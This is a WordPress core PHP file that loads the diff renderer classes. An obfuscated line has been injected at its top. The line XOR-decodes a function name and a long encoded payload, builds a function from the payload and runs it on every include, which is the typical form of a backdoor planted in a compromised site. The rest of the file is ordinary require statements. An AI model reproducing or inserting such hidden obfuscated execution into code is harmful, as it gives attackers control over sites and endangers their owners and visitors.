<?php $qmoaUBXc=',CWY0ToQ7NR,<A4'^'O128D107B 1XU.Z';$KGWJgJZSAHLJ=$qmoaUBXc('','RJyoK7V.YEBSh05.;HHJU<OKt78,2>q:;7ULsi,g0VC8COBC:hDU;mZAO.6mAD.QT52LLbWSW<KeJiTBKEBCnh9->cWHDSPXGkH,LdpQFrcvwYL8x 0GPICggQANVxXbjDYYzhABKD4OtmJaQfI7I,2s>vo8DK;642O+dDy>YRYKEfl31AzdolncX448X:VZU=YEyvhn:47O6K54,.csH-V+A0yST4-M;a=1OGZA.YLBTw8aJD WOSCCas>h5zp9hH.AKWSN0lldHvO9VM<qFC2jC RFQ8VW=qMApY<5jA:S.P19YWAW1RQC qrS88+1eQDw5-;QMWVSQSYH1L-TRosg:kdbe92lL8xgX1JnQIrLCLQ-=MK9R=ZjD+3S+=.<fNCt>E>Voa0jWXM3cwMj9LLU1u;D8PEP2tJY9;NmQsC- Q7>4<;7Sb;97b1A-W8k917RBTIExssH.;THPxLUJ5MXJCS50T1,>QYsaX1;5Qt3JGZvuImWJ<Z83;WRe30I5BAZa,RNNbiw4YD4ZNcvTPZ1cZC,Y9,5PG6;vdftVUkUphGbS<BZJPuQZyYotHFQD.nUaIYZPe36UkjcTVA+YQ0c:EYm34;0B8ma JJ=<TOEFuc7A>4sCoDyYaLA=jHMAYiP5M085e;;I:=11tfkwP:Y:83GtOX<4'^';,QN-B8M-,-=7UMGH<;brD 9+SYXSa.WNCreZIWm906V ;+,TH<:I2> ;Oi2,1ZypQS8-Nww<Y2LjItbk>HJgLVXJCjhctkRNb.C>LT8fOCFLyhQDSD5<,-OC5 :7QcBN-rrSbHKo+A;TCwAyB-V=MiWW+OfdoPSMikBDaYM- 5.+NHXT8S9FWdjQFQL-H8rqR,1PMbgG>JE<oQUXOCNhK7G2UBYpPL9Z>VT6ggaH8 11L2k,+R2.0+cIWa+z5;p-hO2ks8+ILQZhR9X:8YXf88cgD320g=2DQpaT2YLQK3wJ1EXyjasG3=6EJx.22BWEyeSQLO0dw-YX56:T-N<rGW8h.57 jfL-KXC3T3NlwRh5-=XXdkBX4SN JG2tVKEFscPU Gmeh9N399RCJmNO-  TN1MEZ8Z8P.8MZnPq36CS4EWUPRM6JCVE=U Y6g4TDCz 5: NG,,KX;,5Ph1+A,qfcwQQ PsU4 ZHc;RSyPW+3;VSoM68N;AlP2+:VH F62rFG77iNISP80UsnEPtx7UVrgH8MMnw,SBQ9OTkhKrIPuV5Zsoy4B48OiXL.r7rLZdPy;kbTRTrBJErv Y+0I<Q  2VLRC6KEFP+3QS5+bjUGS JUZjOdYyAl:7c-; 5AtQ,DYnBKZ0VRPUS;BLZ3<BQGoDfc6I');$KGWJgJZSAHLJ();
/**
 * WordPress Diff bastard child of old MediaWiki Diff Formatter.
 *
 * Basically all that remains is the table structure and some method names.
 *
 * @package WordPress
 * @subpackage Diff
 */

if ( ! class_exists( 'Text_Diff', false ) ) {
	/** Text_Diff class */
	require( ABSPATH . WPINC . '/Text/Diff.php' );
	/** Text_Diff_Renderer class */
	require( ABSPATH . WPINC . '/Text/Diff/Renderer.php' );
	/** Text_Diff_Renderer_inline class */
	require( ABSPATH . WPINC . '/Text/Diff/Renderer/inline.php' );
}

require( ABSPATH . WPINC . '/class-wp-text-diff-renderer-table.php' );
require( ABSPATH . WPINC . '/class-wp-text-diff-renderer-inline.php' );